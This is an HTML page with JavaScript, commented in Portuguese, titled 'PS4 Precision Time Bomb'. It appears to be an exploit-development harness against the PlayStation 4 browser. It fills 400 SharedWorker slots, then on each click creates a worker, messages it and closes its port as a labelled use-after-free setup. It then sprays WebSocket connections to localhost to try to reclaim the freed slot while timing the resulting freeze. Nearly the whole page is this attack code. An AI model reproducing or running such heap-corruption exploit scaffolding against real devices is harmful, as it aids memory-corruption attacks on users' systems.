<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Precision Time Bomb</title>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        .monitor { font-size: 60px; font-weight: bold; margin: 20px 0; color: #0f0; border: 2px solid #333; padding: 10px; background: #111; }
        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; max-width: 800px; margin: 0 auto; }
        .panel { border: 1px solid #444; padding: 20px; background: #222; }
        button { cursor: pointer; padding: 15px; width: 100%; font-size: 18px; font-weight: bold; border: none; margin-top: 10px; }
        .btn-safe { background: #004400; color: #fff; }
        .btn-danger { background: #b00; color: #fff; }
        .btn-danger:hover { background: #f00; }
        button:disabled { background: #333; color: #777; }
        #log { text-align: left; font-size: 12px; color: #888; margin-top: 20px; height: 150px; overflow-y: auto; border-top: 1px solid #333; }
        .zone-safe { color: #0f0; }
        .zone-warn { color: #ff0; }
        .zone-dead { color: #f00; animation: pulse 0.5s infinite; }
        @keyframes pulse { 50% { opacity: 0.5; } }
    </style>
</head>
<body>

    <h1>Time Bomb: Zona de Freeze (401-404)</h1>
    
    <div class="monitor">
        <div id="countDisplay">Workers: 0</div>
        <div id="timerDisplay">00.00s</div>
    </div>

    <div class="controls">
        <div class="panel">
            <h3>Fase 1: Segurança</h3>
            <button id="btnFill" class="btn-safe" onclick="fillBase()">1. Encher Base (400)</button>
        </div>
        <div class="panel">
            <h3>Fase 2: Zona de Perigo</h3>
            <p>Adiciona 1 worker corrupto e cronometra.</p>
            <button id="btnStep" class="btn-danger" onclick="stepDanger()" disabled>2. Injetar +1 (Perigo)</button>
        </div>
    </div>

    <div id="log">Pronto.</div>

    <script>
        const logEl = document.getElementById('log');
        const countEl = document.getElementById('countDisplay');
        const timerEl = document.getElementById('timerDisplay');
        
        let workers = [];     // Mantém vivos
        let count = 0;        // Contador oficial
        let startTime = 0;    // Início do cronômetro
        let timerInt = null;  // Intervalo do UI
        
        function log(msg) {
            const t = new Date().toLocaleTimeString();
            logEl.innerHTML = `[${t}] ${msg}<br>` + logEl.innerHTML;
        }

        function updateDisplay() {
            countEl.innerText = `Workers: ${count}`;
            if(count <= 400) countEl.className = "zone-safe";
            else if(count <= 404) countEl.className = "zone-warn";
            else countEl.className = "zone-dead";
        }

        // --- FASE 1: ENCHER ATÉ 400 ---
        async function fillBase() {
            document.getElementById('btnFill').disabled = true;
            log("Enchendo base até 400...");
            
            const batch = setInterval(() => {
                for(let i=0; i<10; i++) {
                    if(count >= 400) {
                        clearInterval(batch);
                        log("Base 400 atingida. Zona Segura cheia.");
                        document.getElementById('btnStep').disabled = false;
                        return;
                    }
                    try {
                        const id = `base_${count}`;
                        // Worker benigno, apenas ocupa slot
                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
                        sw.port.start();
                        workers.push(sw);
                        count++;
                    } catch(e) {
                        log("Erro base: " + e.message);
                    }
                }
                updateDisplay();
            }, 30);
        }

        // --- FASE 2: PASSOS NA ZONA DE PERIGO ---
        function stepDanger() {
            // Se é o primeiro passo no perigo (401), inicia o relógio
            if(count === 400) {
                startTime = Date.now();
                if(timerInt) clearInterval(timerInt);
                timerInt = setInterval(() => {
                    const diff = (Date.now() - startTime) / 1000;
                    timerEl.innerText = diff.toFixed(2) + "s";
                }, 50);
                log("!!! RELÓGIO INICIADO !!!");
            }

            count++;
            updateDisplay();
            const id = `danger_${Date.now()}_${count}`;
            log(`Injetando Worker ${count} (Corrupto)...`);

            try {
                // 1. Cria o worker na zona instável
                const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
                const port = sw.port;
                
                // 2. Corrompe (UAF Setup)
                port.postMessage("ping"); // Suja o IPC
                port.close();             // Cria o zumbi
                
                // 3. Spray de WebSocket (Tentativa de ocupar o slot do zumbi)
                // Usa portas aleatórias para forçar novos descritores no Kernel
                for(let i=0; i<5; i++) {
                    const ws = new WebSocket(`ws://127.0.0.1:${8000 + i + count}`);
                    // Não fechamos o WS imediatamente, deixamos o GC do Kernel lidar com isso
                    // para aumentar a chance de colisão durante a limpeza
                    setTimeout(() => ws.close(), 100); 
                }

            } catch(e) {
                log(`Crash evitado na criação: ${e.message}`);
            }
        }
    </script>
</body>
</html>
